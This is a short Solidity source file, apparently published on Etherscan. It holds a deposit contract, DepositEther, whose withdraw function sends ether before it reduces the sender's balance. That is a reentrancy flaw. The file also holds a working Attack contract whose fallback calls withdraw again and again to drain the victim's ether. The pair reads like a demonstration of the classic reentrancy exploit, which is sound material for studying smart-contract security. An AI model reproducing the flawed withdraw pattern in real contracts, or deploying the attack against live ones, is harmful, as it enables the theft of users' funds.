/**
 *Submitted for verification at Etherscan.io on 2021-10-13
*/

pragma solidity ^0.6.8;

// SPDX-License-Identifier: MIT

contract DepositEther{
    
    mapping(address => uint256) public balances;
    
    function deposit() public payable {
        balances[msg.sender]+=msg.value;
    }
    
    function withdraw(uint256 _amount) public payable {
        require(balances[msg.sender]>0);
        
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Failed to send ether");
        balances[msg.sender]-=_amount;
    }
    
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
}

contract Attack{
    DepositEther public DepEth;
    constructor(address _DepEth) public{
        DepEth=DepositEther(_DepEth);
    }
    
    
    fallback () external payable{
        if(address(DepEth).balance>=1 ether){
            DepEth.withdraw(1 ether);
        }
    }
    function attack() external payable{
        DepEth.deposit{value: 1 ether}();
        DepEth.withdraw(1 ether);
        
        
    }
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
}